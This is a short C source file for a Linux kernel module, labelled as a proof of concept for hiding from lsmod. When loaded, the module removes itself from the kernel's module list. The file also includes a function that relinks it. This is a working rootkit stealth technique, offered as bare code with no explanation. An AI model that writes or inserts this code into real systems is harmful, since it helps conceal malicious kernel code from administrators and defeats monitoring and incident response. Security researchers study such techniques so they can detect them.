#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>   


void show(void);
void hide(void);

static struct list_head *prev_module;
static short hidden = 0;

void show(void)
{
    list_add(&THIS_MODULE->list, prev_module);
    hidden = 0;
}

void hide(void)
{
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    hidden = 1;
}

static int __init lsmod_init(void)
{
    printk(KERN_INFO "Module load fdp\n");
    hide();
    return 0;
}

static void __exit lsmod_exit(void)
{
}

module_init(lsmod_init);
module_exit(lsmod_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Wayko");
MODULE_DESCRIPTION("PoC module Hide form lsmod");